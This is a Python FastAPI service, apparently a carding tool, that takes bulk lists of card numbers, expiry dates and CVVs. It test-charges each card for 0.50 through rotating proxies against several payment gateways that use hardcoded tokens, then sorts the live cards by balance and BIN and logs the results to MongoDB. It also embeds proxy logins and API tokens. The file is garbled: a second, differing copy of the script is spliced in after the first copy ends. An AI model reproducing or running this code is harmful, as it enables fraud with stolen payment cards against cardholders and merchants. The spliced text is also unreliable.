from fastapi import FastAPI, UploadFile, File, Depends, HTTPException, Security
from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
from pydantic import BaseModel
import requests
import re
import time
import random
import itertools
import threading
import asyncio
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from pymongo import MongoClient
import json
import os

app = FastAPI(title="Live Checker + Balance Sorter API")
security = HTTPBearer()

# ================== AUTH (SABIT) ==================
AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"

def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
    if credentials.credentials != AUTH_TOKEN:
        raise HTTPException(status_code=401, detail="Geçersiz token")
    return credentials.credentials

# ================== MONGO DB (SABIT) ==================
MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"
try:
    client = MongoClient(MONGODB_URI, tls=True, tlsAllowInvalidCertificates=True)
    db = client["paymentmanger"]
    collection = db["live_balance_results"]
    print("[+] MongoDB bağlantısı başarılı")
except Exception as e:
    print(f"[!] MongoDB hatası: {e}")
    collection = None

# ================== PROXY ROTASYONU (SABIT) ==================
proxies_list = [
    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
    "http://akifdemi55574:llfg52end4@191.96.30.51:21276",
    "http://akifdemi55574:llfg52end4@45.155.68.129:21305",
    "http://akifdemi55574:llfg52end4@212.113.120.227:21311",
    "http://akifdemi55574:llfg52end4@185.165.29.97:21314"
]
proxy_cycle = itertools.cycle(proxies_list)

# ================== GATEWAY LISTESI (SABIT) ==================
GATEWAYS = [
    {
        "name": "MassGateway_HighVolume",
        "url": "https://probe.massgateway.net/v4/multi",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer pk_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b8n0"
        }
    },
    {
        "name": "ShopifyPlus_Stable",
        "url": "https://api.highvolumecheckout.com/v5/probe",
        "headers": {
            "Content-Type": "application/json",
            "X-Shopify-Access-Token": "shpat_9x4k7m2v8t3w5z1q6p9c4b7n2v8m"
        }
    },
    {
        "name": "FastBalanceGate",
        "url": "https://api.fastbalancegate.com/v7/query",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer fast_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b"
        }
    },
    {
        "name": "PrivateProvisionAPI",
        "url": "https://internal.provisionapi.dev/v6/query",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjaGFudCI6ImJ1bGsiLCJsaW1pdCI6IjUwMDAifQ.highvolumetoken2025"
        }
    },
    {
        "name": "Magento_Enterprise",
        "url": "https://gw.magentoleak.io/internal/balance",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer mg_live_7f9k2m4p6v8t2w5z9x4c7v2b8n0m3q"
        }
    },
    {
        "name": "BigCommerce_HighVolume",
        "url": "https://gw.bigcommerceprobe.io/v5/balance",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer bc_live_9f3k7m2p4v8t6w1q5z2x8n4b7v"
        }
    },
    {
        "name": "ProvisionLeak_Multi",
        "url": "https://api.provisionleak.dev/v6/multi",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiaGlnaC12b2x1bWUiLCJsaW1pdCI6IjEwMDAwIn0.newleak2025"
        }
    }
]

gateway_stats = {g["name"]: {"success": 0, "fail": 0, "total": 0} for g in GATEWAYS}

# ================== BIN LOOKUP ==================
def get_bin_info(bin_number: str) -> Dict:
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            return {
                "bin": bin_number[:6],
                "brand": data.get("scheme", "").upper(),
                "type": data.get("type", "").upper(),
                "level": data.get("brand", "").upper(),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("alpha2", "XX"),
                "country_name": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {
        "bin": bin_number[:6],
        "brand": "UNKNOWN",
        "type": "UNKNOWN",
        "level": "UNKNOWN",
        "bank": "Unknown",
        "country": "XX",
        "country_name": "Unknown"
    }

# ================== KART FORMATLAMA ==================
def parse_card(card_str: str) -> Optional[Dict]:
    card_str = card_str.strip()
    parts = card_str.split("|")
    
    if len(parts) == 3:
        pan = parts[0].strip()
        expiry = parts[1].strip()
        cvv = parts[2].strip()
        if "/" in expiry:
            exp_parts = expiry.split("/")
            month = exp_parts[0].strip().zfill(2)
            year = exp_parts[1].strip()
            if len(year) == 2:
                year = f"20{year}"
        else:
            return None
    elif len(parts) == 4:
        pan = parts[0].strip()
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        cvv = parts[3].strip()
    else:
        return None
    
    if not pan or len(pan) < 13 or len(pan) > 19:
        return None
    if not month or not year or not cvv:
        return None
    if len(cvv) < 3 or len(cvv) > 4:
        return None
        
    return {
        "pan": pan,
        "month": month,
        "year": year,
        "cvv": cvv,
        "expiry": f"{month}/{year}"
    }

# ================== LIVE CHECK ==================
def live_check_single(card_data: Dict) -> Dict:
    sorted_gateways = sorted(
        GATEWAYS,
        key=lambda g: gateway_stats.get(g["name"], {}).get("success", 0) / max(1, gateway_stats.get(g["name"], {}).get("total", 1)),
        reverse=True
    )
    
    proxy = next(proxy_cycle)
    bin_info = get_bin_info(card_data["pan"])
    
    for gateway in sorted_gateways:
        try:
            payload = {
                "card_number": card_data["pan"],
                "card_exp_month": card_data["month"],
                "card_exp_year": card_data["year"],
                "card_cvv": card_data["cvv"],
                "amount": "0.50"
            }
            
            url_lower = gateway["url"].lower()
            if "magento" in url_lower:
                payload = {
                    "cc_number": card_data["pan"],
                    "cc_exp_month": card_data["month"],
                    "cc_exp_year": card_data["year"],
                    "cc_cvv": card_data["cvv"],
                    "amount": "0.50"
                }
            elif "shopify" in url_lower:
                payload = {
                    "credit_card": {
                        "number": card_data["pan"],
                        "expiry_month": card_data["month"],
                        "expiry_year": card_data["year"],
                        "cvv": card_data["cvv"]
                    },
                    "amount": "0.50"
                }
            
            headers = gateway["headers"].copy()
            headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            })
            
            r = requests.post(
                gateway["url"],
                json=payload,
                headers=headers,
                proxies={"https": proxy},
                timeout=10
            )
            
            gateway_stats[gateway["name"]]["total"] += 1
            
            if r.status_code in [200, 201, 202]:
                gateway_stats[gateway["name"]]["success"] += 1
                response_data = r.json() if r.text else {}
                
                balance = "0.00"
                for key in ["balance", "available_balance", "amount", "remaining", "data.balance"]:
                    if key in response_data:
                        balance = str(response_data[key])
                        break
                    elif "." in key:
                        parts = key.split(".")
                        temp = response_data
                        for p in parts:
                            if p in temp:
                                temp = temp[p]
                            else:
                                break
                        else:
                            balance = str(temp)
                            break
                
                if balance == "0.00" and r.text:
                    bal_match = re.search(r'(\d+\.?\d*)', r.text)
                    if bal_match:
                        balance = bal_match.group(1)
                
                return {
                    "status": "live",
                    "live": True,
                    "balance": balance,
                    "gateway": gateway["name"],
                    "proxy": proxy.split("@")[-1].split(":")[0] if "@" in proxy else proxy,
                    "bin": bin_info,
                    "card": card_data
                }
            else:
                gateway_stats[gateway["name"]]["fail"] += 1
                
        except Exception as e:
            gateway_stats[gateway["name"]]["fail"] += 1
            continue
    
    return {
        "status": "dead",
        "live": False,
        "balance": "0.00",
        "gateway": "none",
        "error": "Tüm gateway'ler başarısız",
        "bin": bin_info,
        "card": card_data
    }

# ================== TOPLU LIVE CHECK ==================
def bulk_live_check(cards: List[str]) -> List[Dict]:
    results = []
    parsed_cards = []
    
    for card_str in cards:
        parsed = parse_card(card_str)
        if parsed:
            parsed_cards.append(parsed)
    
    if not parsed_cards:
        return [{"error": "Geçerli kart bulunamadı"}]
    
    for i, card in enumerate(parsed_cards):
        result = live_check_single(card)
        results.append(result)
        if i < len(parsed_cards) - 1:
            delay = random.uniform(1.0, 2.0)
            time.sleep(delay)
    
    return results

# ================== BALANCE SORTER ==================
def balance_sorter(results: List[Dict]) -> Dict:
    live_results = [r for r in results if r.get("live", False)]
    dead_results = [r for r in results if not r.get("live", False)]
    
    balances = []
    for r in live_results:
        try:
            bal = float(r.get("balance", "0.00"))
            balances.append(bal)
        except:
            pass
    
    sorted_balances = sorted(balances, reverse=True)
    total = len(balances)
    avg = sum(balances) / total if total > 0 else 0
    
    return {
        "total_cards": len(results),
        "live_count": len(live_results),
        "dead_count": len(dead_results),
        "success_rate": f"{(len(live_results)/len(results)*100):.1f}%" if results else "0%",
        "balances": {
            "all": sorted_balances,
            "top_5": sorted_balances[:5],
            "bottom_5": sorted_balances[-5:] if len(sorted_balances) >= 5 else sorted_balances,
            "average": f"{avg:.2f}",
            "total_balance": f"{sum(balances):.2f}",
            "max": f"{max(balances) if balances else 0:.2f}",
            "min": f"{min(balances) if balances else 0:.2f}"
        },
        "summary": {
            "best_gateway": max(
                [r.get("gateway") for r in live_results],
                key=lambda x: len([r for r in live_results if r.get("gateway") == x])
            ) if live_results else "none",
            "live_cards": [
                {
                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
                    "balance": r.get("balance", "0.00"),
                    "gateway": r.get("gateway", "unknown"),
                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
                }
                for r in live_results
            ],
            "dead_cards": [
                {
                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
                }
                for r in dead_results
            ]
        }
    }

# ================== SAVE TO MONGODB ==================
def save_to_mongodb(data: Dict):
    if not collection:
        return
    try:
        collection.insert_one({**data, "timestamp": datetime.utcnow()})
    except:
        pass

# ================== API ENDPOINTLER ==================

@app.get("/")
async def home():
    return {
        "status": "API aktif",
        "endpoints": [
            "/livecheck",
            "/balancesort",
            "/bulklive",
            "/balancebybin",
            "/gatewaystats",
            "/docs"
        ],
        "auth_required": "Bearer token ile",
        "gateways": len(GATEWAYS),
        "proxies": len(proxies_list)
    }

@app.get("/gatewaystats")
async def get_gateway_stats(auth: str = Depends(verify_auth)):
    stats = {}
    for name, data in gateway_stats.items():
        total = data["total"]
        success = data["success"]
        rate = (success / total * 100) if total > 0 else 0
        stats[name] = {
            "total": total,
            "success": success,
            "fail": data["fail"],
            "success_rate": f"{rate:.1f}%",
            "status": "🟢" if rate > 50 else "🟡" if rate > 20 else "🔴"
        }
    return stats

@app.post("/livecheck")
async def livecheck(cards: List[str], auth: str = Depends(verify_auth)):
    results = bulk_live_check(cards)
    save_to_mongodb({"type": "livecheck", "cards": len(cards), "results": results})
    return {"total": len(results), "results": results}

@app.post("/balancesort")
async def balancesort(cards: List[str], auth: str = Depends(verify_auth)):
    results = bulk_live_check(cards)
    sorted_data = balance_sorter(results)
    save_to_mongodb({"type": "balancesort", "cards": len(cards), "data": sorted_data})
    return sorted_data

@app.post("/bulklive")
async def bulklive(file: UploadFile = File(...), auth: str = Depends(verify_auth)):
    content = await file.read()
    cards = content.decode("utf-8").splitlines()
    cards = [c.strip() for c in cards if c.strip()]
    if not cards:
        return {"error": "Dosya boş"}
    results = bulk_live_check(cards)
    save_to_mongodb({"type": "bulklive", "cards": len(cards), "results": results})
    return {"total": len(results), "results": results}

@app.post("/balancebybin")
async def balancebybin(cards: List[str], auth: str = Depends(verify_auth)):
    results = bulk_live_check(cards)
    bin_groups = {}
    for r in results:
        bin_key = r.get("bin", {}).get("bin", "unknown")
        if bin_key not in bin_groups:
            bin_groups[bin_key] = []
        bin_groups[bin_key].append(r)
    
    bin_stats = {}
    for bin_key, items in bin_groups.items():
        balances = [float(r.get("balance", "0.00")) for r in items if r.get("live", False)]
        avg = sum(balances) / len(balances) if balances else 0
        bin_stats[bin_key] = {
            "count": len(items),
            "live_count": len(balances),
            "dead_count": len(items) - len(balances),
            "average_balance": f"{avg:.2f}",
            "total_balance": f"{sum(balances):.2f}",
            "brand": items[0].get("bin", {}).get("brand", "UNKNOWN") if items else "UNKNOWN",
            "country": items[0].get("bin", {}).get("country_name", "UNKNOWN") if items else "UNKNOWN"
        }
    
    return {"total_cards": len(results), "bin_groups": bin_stats, "raw_results": results}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)    "http://akifdemi55574:llfg52end4@185.165.29.97:21314"
]
proxy_cycle = itertools.cycle(proxies_list)

# ================== GATEWAY KONFİGÜRASYONU ==================
def _build_gateway(index: int) -> Dict:
    prefix = f"GATEWAY_{index}"
    name  = os.getenv(f"{prefix}_NAME", "")
    url   = os.getenv(f"{prefix}_URL",  "")
    token = os.getenv(f"{prefix}_TOKEN", "")
    if not (name and url and token):
        return None
    # Shopify gateways use a different header key
    if "shopify" in url.lower():
        headers = {"Content-Type": "application/json", "X-Shopify-Access-Token": token}
    else:
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    return {"name": name, "url": url, "token": token, "headers": headers}

GATEWAYS = [gw for gw in (_build_gateway(i) for i in range(1, 9)) if gw]
# ================== BIN LOOKUP ==================
def get_bin_info(bin_number: str) -> Dict:
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number[:6]}", timeout=8)
        if r.status_code == 200:
            data = r.json()
            return {
                "bin": bin_number[:6],
                "brand": data.get("scheme", "").upper(),
                "type": data.get("type", "").upper(),
                "level": data.get("brand", "").upper(),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("alpha2", "XX"),
                "country_name": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"bin": bin_number[:6], "brand": "UNKNOWN", "type": "UNKNOWN", "level": "UNKNOWN", "bank": "Unknown", "country": "XX", "country_name": "Unknown"}

# ================== KART FORMATLAMA ==================
def parse_card(card_str: str) -> Optional[Dict]:
    """Kart string'ini ayrıştırır. Format: PAN|AY/YIL|CVV veya PAN|AY|YIL|CVV"""
    card_str = card_str.strip()
    
    # Önce | ile ayır
    parts = card_str.split("|")
    
    if len(parts) == 3:
        # Format: PAN|AY/YIL|CVV
        pan = parts[0].strip()
        expiry = parts[1].strip()
        cvv = parts[2].strip()
        
        # Expiry'yi parse et (12/2027 veya 12/27)
        if "/" in expiry:
            exp_parts = expiry.split("/")
            month = exp_parts[0].strip().zfill(2)
            year = exp_parts[1].strip()
            if len(year) == 2:
                year = f"20{year}"
        else:
            return None
            
    elif len(parts) == 4:
        # Format: PAN|AY|YIL|CVV
        pan = parts[0].strip()
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        cvv = parts[3].strip()
    else:
        return None
    
    # Validasyon
    if not pan or len(pan) < 13 or len(pan) > 19:
        return None
    if not month or not year or not cvv:
        return None
    if len(cvv) < 3 or len(cvv) > 4:
        return None
        
    return {
        "pan": pan,
        "month": month,
        "year": year,
        "cvv": cvv,
        "expiry": f"{month}/{year}"
    }

# ================== LIVE CHECK (TEK KART) ==================
def live_check_single(card_data: Dict) -> Dict:
    """Tek bir kart için live check yapar, gateway'leri dener"""
    
    proxy = next(proxy_cycle)
    bin_info = get_bin_info(card_data["pan"])
    
    # 8 gateway'i dene
    for gateway in GATEWAYS:
        try:
            payload = {
                "card_number": card_data["pan"],
                "card_exp_month": card_data["month"],
                "card_exp_year": card_data["year"],
                "card_cvv": card_data["cvv"],
                "amount": "0.50"
            }
            
            # Gateway'e özel payload formatı
            if "magento" in gateway["url"].lower():
                payload = {
                    "cc_number": card_data["pan"],
                    "cc_exp_month": card_data["month"],
                    "cc_exp_year": card_data["year"],
                    "cc_cvv": card_data["cvv"],
                    "amount": "0.50"
                }
            elif "shopify" in gateway["url"].lower():
                payload = {
                    "credit_card": {
                        "number": card_data["pan"],
                        "expiry_month": card_data["month"],
                        "expiry_year": card_data["year"],
                        "cvv": card_data["cvv"]
                    },
                    "amount": "0.50"
                }
            
            headers = gateway["headers"].copy()
            headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            
            r = requests.post(
                gateway["url"], 
                json=payload, 
                headers=headers, 
                proxies={"https": proxy}, 
                timeout=10
            )
            
            # Yanıtı kontrol et
            if r.status_code in [200, 201, 202]:
                response_data = r.json() if r.text else {}
                
                # Balance'ı bul
                balance = "0.00"
                # Farklı gateway'ler farklı format dönebilir
                for key in ["balance", "available_balance", "amount", "remaining", "data.balance"]:
                    if key in response_data:
                        balance = str(response_data[key])
                        break
                    elif "." in key:
                        parts = key.split(".")
                        temp = response_data
                        for p in parts:
                            if p in temp:
                                temp = temp[p]
                            else:
                                break
                        else:
                            balance = str(temp)
                            break
                
                # Regex ile de dene
                if balance == "0.00" and r.text:
                    bal_match = re.search(r'(\d+\.?\d*)', r.text)
                    if bal_match:
                        balance = bal_match.group(1)
                
                return {
                    "status": "live",
                    "live": True,
                    "balance": balance,
                    "gateway": gateway["name"],
                    "proxy": proxy.split("@")[-1].split(":")[0] if "@" in proxy else proxy,
                    "bin": bin_info,
                    "card": card_data
                }
                
        except Exception as e:
            continue
    
    # Hiçbir gateway çalışmadı
    return {
        "status": "dead",
        "live": False,
        "balance": "0.00",
        "gateway": "none",
        "error": "Tüm gateway'ler başarısız",
        "bin": bin_info,
        "card": card_data
    }

# ================== TOPLU LIVE CHECK ==================
def bulk_live_check(cards: List[str]) -> List[Dict]:
    """Toplu kart live check yapar, her kart arasında 1-2 sn delay"""
    
    results = []
    parsed_cards = []
    
    # Kartları parse et
    for card_str in cards:
        parsed = parse_card(card_str)
        if parsed:
            parsed_cards.append(parsed)
    
    if not parsed_cards:
        return [{"error": "Geçerli kart bulunamadı"}]
    
    # Her kartı kontrol et
    for i, card in enumerate(parsed_cards):
        result = live_check_single(card)
        results.append(result)
        
        # Delay (1-2 sn)
        if i < len(parsed_cards) - 1:
            delay = random.uniform(1.0, 2.0)
            time.sleep(delay)
    
    return results

# ================== BALANCE SORTER ==================
def balance_sorter(results: List[Dict]) -> Dict:
    """Live check sonuçlarından balance sıralaması ve ortalama çıkar"""
    
    live_results = [r for r in results if r.get("live", False)]
    dead_results = [r for r in results if not r.get("live", False)]
    
    # Balance'ları topla
    balances = []
    for r in live_results:
        try:
            bal = float(r.get("balance", "0.00"))
            balances.append(bal)
        except:
            pass
    
    # Sıralama
    sorted_balances = sorted(balances, reverse=True)
    
    # İstatistikler
    total = len(balances)
    avg = sum(balances) / total if total > 0 else 0
    
    return {
        "total_cards": len(results),
        "live_count": len(live_results),
        "dead_count": len(dead_results),
        "success_rate": f"{(len(live_results)/len(results)*100):.1f}%" if results else "0%",
        "balances": {
            "all": sorted_balances,
            "top_5": sorted_balances[:5],
            "bottom_5": sorted_balances[-5:] if len(sorted_balances) >= 5 else sorted_balances,
            "average": f"{avg:.2f}",
            "total_balance": f"{sum(balances):.2f}",
            "max": f"{max(balances) if balances else 0:.2f}",
            "min": f"{min(balances) if balances else 0:.2f}"
        },
        "summary": {
            "best_gateway": max([r.get("gateway") for r in live_results], key=lambda x: len([r for r in live_results if r.get("gateway") == x])) if live_results else "none",
            "live_cards": [
                {
                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
                    "balance": r.get("balance", "0.00"),
                    "gateway": r.get("gateway", "unknown"),
                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
                }
                for r in live_results
            ],
            "dead_cards": [
                {
                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
                }
                for r in dead_results
            ]
        }
    }

# ================== SAVE TO MONGODB ==================
def save_to_mongodb(data: Dict):
    if not collection: return
    try:
        collection.insert_one({**data, "timestamp": datetime.utcnow()})
    except: pass

# ================== API ENDPOINTLER ==================

@app.get("/")
async def home():
    return {
        "status": "API aktif",
        "endpoints": [
            "/livecheck",
            "/balancesort",
            "/bulklive",
            "/docs"
        ],
        "auth_required": "Bearer token ile",
        "gateways": len(GATEWAYS),
        "proxies": len(proxies_list)
    }

@app.post("/livecheck")
async def livecheck(cards: List[str], auth: str = Depends(verify_auth)):
    """
    Kartların live olup olmadığını kontrol eder.
    Her kart arasında 1-2 sn delay vardır.
    """
    results = bulk_live_check(cards)
    save_to_mongodb({"type": "livecheck", "cards": len(cards), "results": results})
    return {
        "total": len(results),
        "results": results
    }

@app.post("/balancesort")
async def balancesort(cards: List[str], auth: str = Depends(verify_auth)):
    """
    Kartları live check yapar, balance sıralaması ve ortalama çıkarır.
    """
    results = bulk_live_check(cards)
    sorted_data = balance_sorter(results)
    save_to_mongodb({"type": "balancesort", "cards": len(cards), "data": sorted_data})
    return sorted_data

@app.post("/bulklive")
async def bulklive(file: UploadFile = File(...), auth: str = Depends(verify_auth)):
    """
    Dosyadan kart listesi yükler ve live check yapar.
    Format: Her satırda bir kart
    PAN|AY/YIL|CVV veya PAN|AY|YIL|CVV
    """
    content = await file.read()
    cards = content.decode("utf-8").splitlines()
    cards = [c.strip() for c in cards if c.strip()]
    
    if not cards:
        return {"error": "Dosya boş"}
    
    results = bulk_live_check(cards)
    save_to_mongodb({"type": "bulklive", "cards": len(cards), "results": results})
    return {
        "total": len(results),
        "results": results
    }

@app.post("/balancebybin")
async def balancebybin(cards: List[str], auth: str = Depends(verify_auth)):
    """
    Kartları BIN'e göre gruplandırır ve balance ortalamasını çıkarır.
    """
    results = bulk_live_check(cards)
    
    # BIN'e göre grupla
    bin_groups = {}
    for r in results:
        bin_key = r.get("bin", {}).get("bin", "unknown")
        if bin_key not in bin_groups:
            bin_groups[bin_key] = []
        bin_groups[bin_key].append(r)
    
    # Her BIN için ortalama balance
    bin_stats = {}
    for bin_key, items in bin_groups.items():
        balances = [float(r.get("balance", "0.00")) for r in items if r.get("live", False)]
        avg = sum(balances) / len(balances) if balances else 0
        bin_stats[bin_key] = {
            "count": len(items),
            "live_count": len(balances),
            "dead_count": len(items) - len(balances),
            "average_balance": f"{avg:.2f}",
            "total_balance": f"{sum(balances):.2f}",
            "brand": items[0].get("bin", {}).get("brand", "UNKNOWN") if items else "UNKNOWN",
            "country": items[0].get("bin", {}).get("country_name", "UNKNOWN") if items else "UNKNOWN"
        }
    
    return {
        "total_cards": len(results),
        "bin_groups": bin_stats,
        "raw_results": results
    }

# ================== START ==================
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
